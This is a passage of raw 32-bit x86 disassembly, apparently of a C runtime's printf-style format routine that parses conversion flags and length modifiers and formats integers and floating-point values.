  4050f6:	mov    ecx,0xf
  4050fb:	xor    esi,esi
  4050fd:	sub    ecx,ebp
  4050ff:	shl    ecx,0x2
  405102:	shrd   eax,edx,cl
  405105:	shr    edx,cl
  405107:	test   cl,0x20
  40510a:	cmovne eax,edx
  40510d:	cmovne edx,esi
  405110:	mov    edi,edx
  405112:	mov    esi,eax
  405114:	jmp    0x404e54
  405119:	lea    esi,[esi+eiz*1+0x0]
  405120:	mov    ecx,ebp
  405122:	jmp    0x404ebd
  405127:	mov    esi,esi
  405129:	lea    edi,[edi+eiz*1+0x0]
  405130:	mov    DWORD PTR [ebx+0x8],0xffffffff
  405137:	test   BYTE PTR [esp+0x18],0x80
  40513c:	jne    0x405090
  405142:	test   DWORD PTR [esp+0x18],0x100
  40514a:	jne    0x4052a7
  405150:	test   BYTE PTR [esp+0x18],0x40
  405155:	jne    0x4052b8
  40515b:	mov    edx,ebx
  40515d:	mov    eax,0x30
  405162:	call   0x403bd0
  405167:	mov    eax,DWORD PTR [ebx+0x4]
  40516a:	mov    edx,ebx
  40516c:	and    eax,0x20
  40516f:	or     eax,0x58
  405172:	call   0x403bd0
  405177:	mov    eax,DWORD PTR [ebx+0x8]
  40517a:	test   eax,eax
  40517c:	jle    0x4051a9
  40517e:	test   BYTE PTR [ebx+0x5],0x2
  405182:	je     0x4051a9
  405184:	sub    eax,0x1
  405187:	mov    DWORD PTR [ebx+0x8],eax
  40518a:	lea    esi,[esi+0x0]
  405190:	mov    edx,ebx
  405192:	mov    eax,0x30
  405197:	call   0x403bd0
  40519c:	mov    eax,DWORD PTR [ebx+0x8]
  40519f:	lea    edx,[eax-0x1]
  4051a2:	test   eax,eax
  4051a4:	mov    DWORD PTR [ebx+0x8],edx
  4051a7:	jg     0x405190
  4051a9:	cmp    ebp,DWORD PTR [esp+0xc]
  4051ad:	mov    esi,DWORD PTR [esp+0xc]
  4051b1:	ja     0x4051d7
  4051b3:	jmp    0x4051fd
  4051b5:	movzx  eax,WORD PTR [ebx+0x1c]
  4051b9:	test   ax,ax
  4051bc:	mov    WORD PTR [esp+0x26],ax
  4051c1:	je     0x4051d3
  4051c3:	lea    eax,[esp+0x26]
  4051c7:	mov    ecx,ebx
  4051c9:	mov    edx,0x1
  4051ce:	call   0x403c30
  4051d3:	cmp    ebp,esi
  4051d5:	je     0x4051fd
  4051d7:	sub    ebp,0x1
  4051da:	movsx  eax,BYTE PTR [ebp+0x0]
  4051de:	cmp    eax,0x2e
  4051e1:	je     0x405240
  4051e3:	cmp    eax,0x2c
  4051e6:	je     0x4051b5
  4051e8:	mov    edx,ebx
  4051ea:	call   0x403bd0
  4051ef:	jmp    0x4051d3
  4051f1:	mov    edx,ebx
  4051f3:	mov    eax,0x30
  4051f8:	call   0x403bd0
  4051fd:	mov    eax,DWORD PTR [ebx+0xc]
  405200:	lea    edx,[eax-0x1]
  405203:	test   eax,eax
  405205:	mov    DWORD PTR [ebx+0xc],edx
  405208:	jg     0x4051f1
  40520a:	mov    eax,DWORD PTR [ebx+0x4]
  40520d:	mov    edx,ebx
  40520f:	and    eax,0x20
  405212:	or     eax,0x50
  405215:	call   0x403bd0
  40521a:	mov    eax,DWORD PTR [esp+0x10]
  40521e:	add    DWORD PTR [ebx+0x8],edi
  405221:	mov    ecx,ebx
  405223:	or     DWORD PTR [ebx+0x4],0x1c0
  40522a:	cdq    
  40522b:	call   0x403f00
  405230:	add    esp,0x5c
  405233:	pop    ebx
  405234:	pop    esi
  405235:	pop    edi
  405236:	pop    ebp
  405237:	ret    
  405238:	nop
  405239:	lea    esi,[esi+eiz*1+0x0]
  405240:	mov    eax,ebx
  405242:	call   0x4045b0
  405247:	jmp    0x4051d3
  405249:	movsx  eax,WORD PTR [esp+0x16]
  40524e:	mov    edi,0x2
  405253:	mov    DWORD PTR [esp+0x10],eax
  405257:	jmp    0x405137
  40525c:	mov    ebp,DWORD PTR [ebx+0xc]
  40525f:	cmp    ebp,0xe
  405262:	jbe    0x40529e
  405264:	xor    edx,edx
  405266:	mov    WORD PTR [esp+0x16],dx
  40526b:	mov    eax,DWORD PTR [ebx+0x4]
  40526e:	mov    DWORD PTR [esp+0x18],eax
  405272:	lea    eax,[esp+0x38]
  405276:	mov    DWORD PTR [esp+0xc],eax
  40527a:	test   ebp,ebp
  40527c:	jle    0x405321
  405282:	lea    eax,[esp+0x39]
  405286:	mov    BYTE PTR [esp+0x38],0x2e
  40528b:	lea    ebp,[eax+0x1]
  40528e:	mov    BYTE PTR [eax],0x30
  405291:	jmp    0x404fb5
  405296:	mov    DWORD PTR [ebx+0x8],eax
  405299:	jmp    0x405137
  40529e:	xor    esi,esi
  4052a0:	xor    edi,edi
  4052a2:	jmp    0x4050b0
  4052a7:	mov    edx,ebx
  4052a9:	mov    eax,0x2b
  4052ae:	call   0x403bd0
  4052b3:	jmp    0x40515b
  4052b8:	mov    edx,ebx
  4052ba:	mov    eax,0x20
  4052bf:	call   0x403bd0
  4052c4:	jmp    0x40515b
  4052c9:	add    WORD PTR [esp+0x16],0x1
  4052cf:	jmp    0x4050f6
  4052d4:	fstp   st(0)
  4052d6:	mov    ecx,ebx
  4052d8:	mov    edx,0x40dca8
  4052dd:	xor    eax,eax
  4052df:	call   0x403e60
  4052e4:	jmp    0x405230
  4052e9:	mov    ecx,ebx
  4052eb:	mov    edx,0x40dcac
  4052f0:	mov    eax,esi
  4052f2:	call   0x403e60
  4052f7:	jmp    0x405230
  4052fc:	mov    edi,0x2
  405301:	jmp    0x40502d
  405306:	mov    ebp,DWORD PTR [ebx+0xc]
  405309:	jmp    0x40527a
  40530e:	mov    esi,eax
  405310:	mov    eax,0xffffc002
  405315:	mov    edi,edx
  405317:	mov    WORD PTR [esp+0x16],ax
  40531c:	jmp    0x404f88
  405321:	test   DWORD PTR [esp+0x18],0x800
  405329:	mov    eax,DWORD PTR [esp+0xc]
  40532d:	je     0x40528b
  405333:	jmp    0x405282
  405338:	nop
  405339:	lea    esi,[esi+eiz*1+0x0]
  405340:	push   ebp
  405341:	push   edi
  405342:	push   esi
  405343:	push   ebx
  405344:	xor    esi,esi
  405346:	xor    ebx,ebx
  405348:	sub    esp,0x6c
  40534b:	mov    ebp,DWORD PTR [esp+0x8c]
  405352:	call   0x40ad60
  405357:	mov    eax,DWORD PTR [eax]
  405359:	mov    DWORD PTR [esp],0x40dcc5
  405360:	mov    DWORD PTR [esp+0x3c],0xffffffff
  405368:	mov    DWORD PTR [esp+0x40],0xffffffff
  405370:	mov    DWORD PTR [esp+0x44],0xfffffffd
  405378:	mov    WORD PTR [esp+0x48],bx
  40537d:	mov    DWORD PTR [esp+0x1c],eax
  405381:	mov    eax,DWORD PTR [esp+0x84]
  405388:	mov    DWORD PTR [esp+0x4c],0x0
  405390:	mov    WORD PTR [esp+0x50],si
  405395:	mov    DWORD PTR [esp+0x54],0x0
  40539d:	mov    DWORD PTR [esp+0x34],eax
  4053a1:	mov    eax,DWORD PTR [esp+0x80]
  4053a8:	and    eax,0x6000
  4053ad:	mov    DWORD PTR [esp+0x18],eax
  4053b1:	mov    DWORD PTR [esp+0x38],eax
  4053b5:	mov    eax,DWORD PTR [esp+0x88]
  4053bc:	mov    DWORD PTR [esp+0x58],eax
  4053c0:	call   0x40ad00
  4053c5:	test   eax,eax
  4053c7:	je     0x4053d9
  4053c9:	movsx  edx,BYTE PTR [eax]
  4053cc:	mov    eax,0x2
  4053d1:	sub    edx,0x30
  4053d4:	cmp    edx,0x2
  4053d7:	jbe    0x4053e6
  4053d9:	call   0x40ae80
  4053de:	and    eax,0x1
  4053e1:	neg    eax
  4053e3:	add    eax,0x3
  4053e6:	mov    DWORD PTR [esp+0x5c],eax
  4053ea:	movzx  edx,BYTE PTR [ebp+0x0]
  4053ee:	xchg   ax,ax
  4053f0:	movsx  eax,dl
  4053f3:	lea    esi,[ebp+0x1]
  4053f6:	test   eax,eax
  4053f8:	je     0x405490
  4053fe:	cmp    eax,0x25
  405401:	jne    0x4054a0
  405407:	mov    eax,DWORD PTR [esp+0x18]
  40540b:	movzx  edx,BYTE PTR [ebp+0x1]
  40540f:	xor    edi,edi
  405411:	mov    DWORD PTR [esp+0x40],0xffffffff
  405419:	mov    DWORD PTR [esp+0x3c],0xffffffff
  405421:	mov    ebx,esi
  405423:	mov    DWORD PTR [esp+0x10],0x0
  40542b:	mov    DWORD PTR [esp+0x38],eax
  40542f:	lea    eax,[esp+0x3c]
  405433:	test   dl,dl
  405435:	mov    DWORD PTR [esp+0x14],eax
  405439:	je     0x405477
  40543b:	lea    ecx,[edx-0x20]
  40543e:	lea    ebp,[ebx+0x1]
  405441:	movsx  eax,dl
  405444:	cmp    cl,0x5a
  405447:	ja     0x405ac0
  40544d:	movzx  ecx,cl
  405450:	jmp    DWORD PTR [ecx*4+0x40dcdc]
  405457:	mov    esi,esi
  405459:	lea    edi,[edi+eiz*1+0x0]
  405460:	movzx  edx,BYTE PTR [ebx+0x1]
  405464:	mov    DWORD PTR [esp+0x10],0x2
  40546c:	mov    edi,0x4
  405471:	mov    ebx,ebp
  405473:	test   dl,dl
  405475:	jne    0x40543b
  405477:	movsx  eax,dl
  40547a:	mov    ebp,ebx
  40547c:	test   eax,eax
  40547e:	lea    esi,[ebp+0x1]
  405481:	jne    0x4053fe
  405487:	mov    esi,esi
  405489:	lea    edi,[edi+eiz*1+0x0]
  405490:	mov    eax,DWORD PTR [esp+0x54]
  405494:	add    esp,0x6c
  405497:	pop    ebx
  405498:	pop    esi
  405499:	pop    edi
  40549a:	pop    ebp
  40549b:	ret    
  40549c:	lea    esi,[esi+eiz*1+0x0]
  4054a0:	lea    edx,[esp+0x34]
  4054a4:	call   0x403bd0
  4054a9:	movzx  edx,BYTE PTR [ebp+0x1]
  4054ad:	mov    ebp,esi
  4054af:	jmp    0x4053f0
  4054b4:	mov    edx,DWORD PTR [esp+0x10]
  4054b8:	mov    eax,DWORD PTR [esp+0x90]
  4054bf:	sub    edx,0x2
  4054c2:	cmp    edx,0x1
  4054c5:	jbe    0x405b12
  4054cb:	mov    ebx,DWORD PTR [eax]
  4054cd:	add    DWORD PTR [esp+0x90],0x4
  4054d5:	test   ebx,ebx
  4054d7:	je     0x4055b7
  4054dd:	mov    DWORD PTR [esp],ebx
  4054e0:	call   0x40acd0
  4054e5:	mov    edx,eax
  4054e7:	lea    ecx,[esp+0x34]
  4054eb:	mov    eax,ebx
  4054ed:	call   0x403d50
  4054f2:	movzx  edx,BYTE PTR [ebp+0x0]
  4054f6:	jmp    0x4053f0
  4054fb:	nop
  4054fc:	lea    esi,[esi+eiz*1+0x0]
  405500:	test   edi,edi
  405502:	jne    0x405512
  405504:	mov    eax,DWORD PTR [esp+0x18]
  405508:	cmp    DWORD PTR [esp+0x38],eax
  40550c:	je     0x405d1d
  405512:	mov    eax,DWORD PTR [esp+0x90]
  405519:	xor    ecx,ecx
  40551b:	mov    DWORD PTR [esp+0x2c],0x0
  405523:	lea    ebx,[eax+0x4]
  405526:	mov    eax,DWORD PTR [eax]
  405528:	mov    DWORD PTR [esp+0x28],eax
  40552c:	mov    eax,DWORD PTR [esp+0x90]
  405533:	mov    edx,DWORD PTR [eax]
  405535:	lea    eax,[esp+0x34]
  405539:	mov    DWORD PTR [esp],eax
  40553c:	mov    eax,0x78
  405541:	call   0x404200
  405546:	mov    DWORD PTR [esp+0x90],ebx
  40554d:	jmp    0x4054f2
  40554f:	nop
  405550:	cmp    DWORD PTR [esp+0x10],0x4
  405555:	mov    eax,DWORD PTR [esp+0x90]
  40555c:	mov    edx,DWORD PTR [esp+0x54]
  405560:	mov    eax,DWORD PTR [eax]
  405562:	je     0x405c75
  405568:	cmp    DWORD PTR [esp+0x10],0x1
  40556d:	je     0x405ce0
  405573:	cmp    DWORD PTR [esp+0x10],0x2
  405578:	je     0x405d7d
  40557e:	cmp    DWORD PTR [esp+0x10],0x3
  405583:	mov    DWORD PTR [eax],edx
  405585:	je     0x405df2
  40558b:	mov    eax,DWORD PTR [esp+0x90]
  405592:	add    eax,0x4
  405595:	mov    DWORD PTR [esp+0x90],eax
  40559c:	jmp    0x4054f2
  4055a1:	mov    eax,DWORD PTR [esp+0x1c]
  4055a5:	mov    DWORD PTR [esp],eax
  4055a8:	call   0x40acd8
  4055ad:	test   eax,eax
  4055af:	mov    ebx,eax
  4055b1:	jne    0x4054dd
  4055b7:	mov    edx,0x6
  4055bc:	mov    ebx,0x40dcbe
  4055c1:	jmp    0x4054e7
  4055c6:	lea    esi,[esi+0x0]
  4055c9:	lea    edi,[edi+eiz*1+0x0]
  4055d0:	movzx  edx,BYTE PTR [ebx+0x1]
  4055d4:	cmp    dl,0x6c
  4055d7:	je     0x405bf8
  4055dd:	mov    DWORD PTR [esp+0x10],0x2
  4055e5:	mov    edi,0x4
  4055ea:	mov    ebx,ebp
  4055ec:	jmp    0x405473
  4055f1:	movzx  edx,BYTE PTR [ebx+0x1]
  4055f5:	mov    DWORD PTR [esp+0x10],0x3
  4055fd:	mov    edi,0x4
  405602:	mov    ebx,ebp
  405604:	jmp    0x405473
  405609:	lea    esi,[esi+eiz*1+0x0]
  405610:	mov    eax,DWORD PTR [esp+0x38]
  405614:	mov    edx,DWORD PTR [esp+0x90]
  40561b:	or     eax,0x20
  40561e:	test   al,0x4
  405620:	mov    DWORD PTR [esp+0x38],eax
  405624:	je     0x4058a3
  40562a:	fld    TBYTE PTR [edx]
  40562c:	lea    eax,[esp+0x34]
  405630:	add    DWORD PTR [esp+0x90],0xc
  405638:	fstp   TBYTE PTR [esp]
  40563b:	call   0x404c40
  405640:	jmp    0x4054f2
  405645:	mov    eax,DWORD PTR [esp+0x38]
  405649:	mov    edx,DWORD PTR [esp+0x90]
  405650:	or     eax,0x20
  405653:	test   al,0x4
  405655:	mov    DWORD PTR [esp+0x38],eax
  405659:	je     0x4058d3
  40565f:	fld    TBYTE PTR [edx]
  405661:	lea    eax,[esp+0x34]
  405665:	add    DWORD PTR [esp+0x90],0xc
  40566d:	fstp   TBYTE PTR [esp]
  405670:	call   0x404b60
  405675:	jmp    0x4054f2
  40567a:	lea    esi,[esi+0x0]
  405680:	movzx  edx,BYTE PTR [ebx+0x1]
  405684:	cmp    dl,0x68
  405687:	je     0x405bdd
  40568d:	mov    DWORD PTR [esp+0x10],0x1
  405695:	mov    edi,0x4
  40569a:	mov    ebx,ebp
  40569c:	jmp    0x405473
  4056a1:	mov    eax,DWORD PTR [esp+0x38]
  4056a5:	mov    edx,DWORD PTR [esp+0x90]
  4056ac:	or     eax,0x20
  4056af:	test   al,0x4
  4056b1:	mov    DWORD PTR [esp+0x38],eax
  4056b5:	je     0x405903
  4056bb:	fld    TBYTE PTR [edx]
  4056bd:	lea    eax,[esp+0x34]
  4056c1:	add    DWORD PTR [esp+0x90],0xc
  4056c9:	fstp   TBYTE PTR [esp]
  4056cc:	call   0x404ab0
  4056d1:	jmp    0x4054f2
  4056d6:	lea    esi,[esi+0x0]
  4056d9:	lea    edi,[edi+eiz*1+0x0]
  4056e0:	or     DWORD PTR [esp+0x38],0x80
  4056e8:	cmp    DWORD PTR [esp+0x10],0x3
  4056ed:	mov    eax,DWORD PTR [esp+0x90]
  4056f4:	je     0x405c13
  4056fa:	cmp    DWORD PTR [esp+0x10],0x2
  4056ff:	je     0x405cbd
  405705:	lea    edx,[eax+0x4]
  405708:	mov    eax,DWORD PTR [eax]
  40570a:	mov    DWORD PTR [esp+0x28],eax
  40570e:	sar    eax,0x1f
  405711:	cmp    DWORD PTR [esp+0x10],0x1
  405716:	mov    DWORD PTR [esp+0x2c],eax
  40571a:	je     0x405d61
  405720:	cmp    DWORD PTR [esp+0x10],0x4
  405725:	mov    DWORD PTR [esp+0x90],edx
  40572c:	je     0x405ddd
  405732:	mov    eax,DWORD PTR [esp+0x28]
  405736:	mov    edx,DWORD PTR [esp+0x2c]
  40573a:	lea    ecx,[esp+0x34]
  40573e:	call   0x403f00
  405743:	jmp    0x4054f2
  405748:	nop
  405749:	lea    esi,[esi+eiz*1+0x0]
  405750:	mov    edx,DWORD PTR [esp+0x10]
  405754:	mov    eax,DWORD PTR [esp+0x90]
  40575b:	mov    DWORD PTR [esp+0x40],0xffffffff
  405763:	sub    edx,0x2
  405766:	cmp    edx,0x1
  405769:	jbe    0x405928
  40576f:	mov    eax,DWORD PTR [eax]
  405771:	lea    ecx,[esp+0x34]
  405775:	mov    edx,0x1
  40577a:	add    DWORD PTR [esp+0x90],0x4
  405782:	mov    BYTE PTR [esp+0x28],al
  405786:	lea    eax,[esp+0x28]
  40578a:	call   0x403d50
  40578f:	jmp    0x4054f2
  405794:	mov    eax,DWORD PTR [esp+0x38]
  405798:	mov    edx,DWORD PTR [esp+0x90]
  40579f:	or     eax,0x20
  4057a2:	test   al,0x4
  4057a4:	mov    DWORD PTR [esp+0x38],eax
  4057a8:	je     0x405973
  4057ae:	fld    TBYTE PTR [edx]
  4057b0:	lea    eax,[esp+0x34]
  4057b4:	add    DWORD PTR [esp+0x90],0xc
  4057bc:	fstp   TBYTE PTR [esp]
  4057bf:	call   0x404dd0
  4057c4:	jmp    0x4054f2
  4057c9:	lea    esi,[esi+eiz*1+0x0]
  4057d0:	cmp    DWORD PTR [esp+0x10],0x3
  4057d5:	mov    edi,DWORD PTR [esp+0x90]
  4057dc:	je     0x405c59
  4057e2:	cmp    DWORD PTR [esp+0x10],0x2
  4057e7:	je     0x405cf9
  4057ed:	cmp    DWORD PTR [esp+0x10],0x1
  4057f2:	lea    edx,[edi+0x4]
  4057f5:	mov    edi,DWORD PTR [edi]
  4057f7:	mov    DWORD PTR [esp+0x2c],0x0
  4057ff:	mov    DWORD PTR [esp+0x28],edi
  405803:	je     0x405d95
  405809:	cmp    DWORD PTR [esp+0x10],0x4
  40580e:	mov    DWORD PTR [esp+0x90],edx
  405815:	je     0x405dc7
  40581b:	cmp    eax,0x75
  40581e:	je     0x405732
  405824:	lea    edi,[esp+0x34]
  405828:	mov    edx,DWORD PTR [esp+0x28]
  40582c:	mov    ecx,DWORD PTR [esp+0x2c]
  405830:	mov    DWORD PTR [esp],edi
  405833:	call   0x404200
  405838:	jmp    0x4054f2
  40583d:	lea    esi,[esi+0x0]
  405840:	movzx  edx,BYTE PTR [ebx+0x1]
  405844:	or     DWORD PTR [esp+0x38],0x4
  405849:	mov    edi,0x4
  40584e:	mov    ebx,ebp
  405850:	jmp    0x405473
  405855:	movzx  edx,BYTE PTR [ebx+0x1]
  405859:	cmp    dl,0x36
  40585c:	je     0x405c36
  405862:	cmp    dl,0x33
  405865:	jne    0x4055dd
  40586b:	cmp    BYTE PTR [ebx+0x2],0x32
  40586f:	je     0x405d31
  405875:	mov    edx,0x33
  40587a:	mov    DWORD PTR [esp+0x10],0x2
  405882:	mov    edi,0x4
  405887:	mov    ebx,ebp
  405889:	jmp    0x405473
  40588e:	xchg   ax,ax
  405890:	mov    eax,DWORD PTR [esp+0x38]
  405894:	mov    edx,DWORD PTR [esp+0x90]
  40589b:	test   al,0x4
  40589d:	jne    0x40562a
  4058a3:	fld    QWORD PTR [edx]
  4058a5:	lea    eax,[esp+0x34]
  4058a9:	add    DWORD PTR [esp+0x90],0x8
  4058b1:	fstp   TBYTE PTR [esp]
  4058b4:	call   0x404c40
  4058b9:	jmp    0x4054f2
  4058be:	xchg   ax,ax
  4058c0:	mov    eax,DWORD PTR [esp+0x38]
  4058c4:	mov    edx,DWORD PTR [esp+0x90]
  4058cb:	test   al,0x4
  4058cd:	jne    0x40565f
  4058d3:	fld    QWORD PTR [edx]
  4058d5:	lea    eax,[esp+0x34]
  4058d9:	add    DWORD PTR [esp+0x90],0x8
  4058e1:	fstp   TBYTE PTR [esp]
  4058e4:	call   0x404b60
  4058e9:	jmp    0x4054f2
  4058ee:	xchg   ax,ax
  4058f0:	mov    eax,DWORD PTR [esp+0x38]
  4058f4:	mov    edx,DWORD PTR [esp+0x90]
  4058fb:	test   al,0x4
  4058fd:	jne    0x4056bb
  405903:	fld    QWORD PTR [edx]
  405905:	lea    eax,[esp+0x34]
  405909:	add    DWORD PTR [esp+0x90],0x8
  405911:	fstp   TBYTE PTR [esp]
  405914:	call   0x404ab0
  405919:	jmp    0x4054f2
  40591e:	xchg   ax,ax
  405920:	mov    DWORD PTR [esp+0x40],0xffffffff
  405928:	mov    eax,DWORD PTR [esp+0x90]
  40592f:	lea    ecx,[esp+0x34]
  405933:	mov    edx,0x1
  405938:	lea    ebx,[eax+0x4]
  40593b:	mov    eax,DWORD PTR [eax]
  40593d:	mov    WORD PTR [esp+0x28],ax
  405942:	lea    eax,[esp+0x28]
  405946:	call   0x403c30
  40594b:	mov    DWORD PTR [esp+0x90],ebx
  405952:	jmp    0x4054f2
  405957:	mov    esi,esi
  405959:	lea    edi,[edi+eiz*1+0x0]
  405960:	mov    eax,DWORD PTR [esp+0x38]
  405964:	mov    edx,DWORD PTR [esp+0x90]
  40596b:	test   al,0x4
  40596d:	jne    0x4057ae
  405973:	fld    QWORD PTR [edx]
  405975:	lea    eax,[esp+0x34]
  405979:	add    DWORD PTR [esp+0x90],0x8
  405981:	fstp   TBYTE PTR [esp]
  405984:	call   0x404dd0
  405989:	jmp    0x4054f2
  40598e:	xchg   ax,ax
  405990:	test   edi,edi
  405992:	jne    0x405b50
  405998:	movzx  edx,BYTE PTR [ebx+0x1]
  40599c:	or     DWORD PTR [esp+0x38],0x200
  4059a4:	mov    ebx,ebp
  4059a6:	jmp    0x405473
  4059ab:	nop
  4059ac:	lea    esi,[esi+eiz*1+0x0]
  4059b0:	cmp    edi,0x1
  4059b3:	jbe    0x405c8d
  4059b9:	movzx  edx,BYTE PTR [ebx+0x1]
  4059bd:	mov    edi,0x4
  4059c2:	mov    ebx,ebp
  4059c4:	jmp    0x405473
  4059c9:	lea    esi,[esi+eiz*1+0x0]
  4059d0:	test   edi,edi
  4059d2:	jne    0x405a4c
  4059d4:	movzx  edx,BYTE PTR [ebx+0x1]
  4059d8:	or     DWORD PTR [esp+0x38],0x400
  4059e0:	mov    ebx,ebp
  4059e2:	jmp    0x405473
  4059e7:	mov    esi,esi
  4059e9:	lea    edi,[edi+eiz*1+0x0]
  4059f0:	test   edi,edi
  4059f2:	jne    0x405a4c
  4059f4:	movzx  edx,BYTE PTR [ebx+0x1]
  4059f8:	or     DWORD PTR [esp+0x38],0x100
  405a00:	mov    ebx,ebp
  405a02:	jmp    0x405473
  405a07:	mov    esi,esi
  405a09:	lea    edi,[edi+eiz*1+0x0]
  405a10:	test   edi,edi
  405a12:	jne    0x405a4c
  405a14:	movzx  edx,BYTE PTR [ebx+0x1]
  405a18:	or     DWORD PTR [esp+0x38],0x800
  405a20:	mov    ebx,ebp
  405a22:	jmp    0x405473
  405a27:	mov    esi,esi
  405a29:	lea    edi,[edi+eiz*1+0x0]
  405a30:	test   edi,edi
  405a32:	jne    0x405a4c
  405a34:	movzx  edx,BYTE PTR [ebx+0x1]
  405a38:	or     DWORD PTR [esp+0x38],0x40
  405a3d:	mov    ebx,ebp
  405a3f:	jmp    0x405473
  405a44:	test   edi,edi
  405a46:	je     0x405b88
  405a4c:	movzx  edx,BYTE PTR [ebx+0x1]
  405a50:	mov    ebx,ebp
  405a52:	jmp    0x405473
  405a57:	mov    esi,esi
  405a59:	lea    edi,[edi+eiz*1+0x0]
  405a60:	lea    edx,[esp+0x34]
  405a64:	call   0x403bd0
  405a69:	jmp    0x4054f2
  405a6e:	xchg   ax,ax
  405a70:	mov    ecx,DWORD PTR [esp+0x14]
  405a74:	test   ecx,ecx
  405a76:	je     0x4059b9
  405a7c:	test   edi,0xfffffffd
  405a82:	jne    0x405b70
  405a88:	mov    eax,DWORD PTR [esp+0x90]
  405a8f:	mov    edx,DWORD PTR [esp+0x14]
  405a93:	lea    ecx,[eax+0x4]
  405a96:	mov    eax,DWORD PTR [eax]
  405a98:	test   eax,eax
  405a9a:	mov    DWORD PTR [edx],eax
  405a9c:	js     0x405db2
  405aa2:	movzx  edx,BYTE PTR [ebx+0x1]
  405aa6:	mov    DWORD PTR [esp+0x90],ecx
  405aad:	mov    ebx,ebp
  405aaf:	mov    DWORD PTR [esp+0x14],0x0
  405ab7:	jmp    0x405473
  405abc:	lea    esi,[esi+eiz*1+0x0]
  405ac0:	sub    edx,0x30
  405ac3:	cmp    dl,0x9
  405ac6:	ja     0x405d4c
  405acc:	cmp    edi,0x3
  405acf:	ja     0x405d4c
  405ad5:	test   edi,edi
  405ad7:	jne    0x405b59
  405add:	mov    edi,0x1
  405ae2:	mov    edx,DWORD PTR [esp+0x14]
  405ae6:	test   edx,edx
  405ae8:	je     0x405a4c
  405aee:	mov    ecx,DWORD PTR [esp+0x14]
  405af2:	mov    edx,DWORD PTR [ecx]
  405af4:	test   edx,edx
  405af6:	js     0x405cad
  405afc:	lea    edx,[edx+edx*4]
  405aff:	mov    ecx,DWORD PTR [esp+0x14]
  405b03:	lea    eax,[eax+edx*2-0x30]
  405b07:	movzx  edx,BYTE PTR [ebx+0x1]
  405b0b:	mov    DWORD PTR [ecx],eax
  405b0d:	jmp    0x405a50
  405b12:	mov    eax,DWORD PTR [esp+0x90]
  405b19:	mov    ebx,DWORD PTR [eax]
  405b1b:	lea    esi,[eax+0x4]
  405b1e:	mov    eax,0x40dcb0
  405b23:	test   ebx,ebx
  405b25:	cmove  ebx,eax
  405b28:	mov    DWORD PTR [esp],ebx
  405b2b:	call   0x40ac90
  405b30:	lea    ecx,[esp+0x34]
  405b34:	mov    edx,eax
  405b36:	mov    eax,ebx
  405b38:	call   0x403c30
  405b3d:	mov    DWORD PTR [esp+0x90],esi
  405b44:	jmp    0x4054f2
  405b49:	lea    esi,[esi+eiz*1+0x0]
  405b50:	cmp    edi,0x3
  405b53:	ja     0x405d4c
  405b59:	cmp    edi,0x2
  405b5c:	mov    edx,0x3
  405b61:	cmove  edi,edx
  405b64:	jmp    0x405ae2
  405b69:	lea    esi,[esi+eiz*1+0x0]
  405b70:	movzx  edx,BYTE PTR [ebx+0x1]
  405b74:	mov    DWORD PTR [esp+0x14],0x0
  405b7c:	mov    edi,0x4
  405b81:	mov    ebx,ebp
  405b83:	jmp    0x405473
  405b88:	or     DWORD PTR [esp+0x38],0x1000
  405b90:	mov    DWORD PTR [esp+0x28],0x0
  405b98:	call   0x40acf8
  405b9d:	lea    ecx,[esp+0x28]
  405ba1:	mov    DWORD PTR [esp+0x8],0x10
  405ba9:	mov    DWORD PTR [esp+0xc],ecx
  405bad:	mov    eax,DWORD PTR [eax+0x4]
  405bb0:	mov    DWORD PTR [esp+0x4],eax
  405bb4:	lea    eax,[esp+0x26]
  405bb8:	mov    DWORD PTR [esp],eax
  405bbb:	call   0x40a850
  405bc0:	test   eax,eax
  405bc2:	jle    0x405bce
  405bc4:	movzx  edx,WORD PTR [esp+0x26]
  405bc9:	mov    WORD PTR [esp+0x50],dx
  405bce:	movzx  edx,BYTE PTR [ebx+0x1]
  405bd2:	mov    DWORD PTR [esp+0x4c],eax
  405bd6:	mov    ebx,ebp
  405bd8:	jmp    0x405473
  405bdd:	lea    ebp,[ebx+0x2]
  405be0:	movzx  edx,BYTE PTR [ebx+0x2]
  405be4:	mov    DWORD PTR [esp+0x10],0x4
  405bec:	mov    edi,0x4
  405bf1:	mov    ebx,ebp
  405bf3:	jmp    0x405473
  405bf8:	lea    ebp,[ebx+0x2]
  405bfb:	movzx  edx,BYTE PTR [ebx+0x2]
  405bff:	mov    DWORD PTR [esp+0x10],0x3
  405c07:	mov    edi,0x4
  405c0c:	mov    ebx,ebp
  405c0e:	jmp    0x405473
  405c13:	mov    edx,DWORD PTR [eax+0x4]
  405c16:	mov    eax,DWORD PTR [eax]
  405c18:	mov    DWORD PTR [esp+0x28],eax
  405c1c:	mov    eax,DWORD PTR [esp+0x90]
  405c23:	mov    DWORD PTR [esp+0x2c],edx
  405c27:	add    eax,0x8
  405c2a:	mov    DWORD PTR [esp+0x90],eax
  405c31:	jmp    0x405732
  405c36:	cmp    BYTE PTR [ebx+0x2],0x34
  405c3a:	je     0x405e10
  405c40:	mov    edx,0x36
  405c45:	mov    DWORD PTR [esp+0x10],0x2
  405c4d:	mov    edi,0x4
  405c52:	mov    ebx,ebp
  405c54:	jmp    0x405473
  405c59:	mov    ecx,DWORD PTR [edi]
  405c5b:	mov    ebx,DWORD PTR [edi+0x4]
  405c5e:	add    edi,0x8
  405c61:	mov    DWORD PTR [esp+0x90],edi
  405c68:	mov    DWORD PTR [esp+0x28],ecx
  405c6c:	mov    DWORD PTR [esp+0x2c],ebx
  405c70:	jmp    0x40581b
  405c75:	mov    BYTE PTR [eax],dl
  405c77:	mov    eax,DWORD PTR [esp+0x90]
  405c7e:	add    eax,0x4
  405c81:	mov    DWORD PTR [esp+0x90],eax
  405c88:	jmp    0x4054f2
  405c8d:	lea    eax,[esp+0x40]
  405c91:	movzx  edx,BYTE PTR [ebx+0x1]
  405c95:	mov    DWORD PTR [esp+0x40],0x0
  405c9d:	mov    edi,0x2
  405ca2:	mov    ebx,ebp
  405ca4:	mov    DWORD PTR [esp+0x14],eax
  405ca8:	jmp    0x405473
  405cad:	sub    eax,0x30
  405cb0:	movzx  edx,BYTE PTR [ebx+0x1]
  405cb4:	mov    ebx,ebp
  405cb6:	mov    DWORD PTR [ecx],eax
  405cb8:	jmp    0x405473
  405cbd:	mov    eax,DWORD PTR [eax]
  405cbf:	mov    DWORD PTR [esp+0x28],eax
  405cc3:	sar    eax,0x1f
  405cc6:	mov    DWORD PTR [esp+0x2c],eax
  405cca:	mov    eax,DWORD PTR [esp+0x90]
  405cd1:	add    eax,0x4
  405cd4:	mov    DWORD PTR [esp+0x90],eax
  405cdb:	jmp    0x405732
  405ce0:	mov    WORD PTR [eax],dx
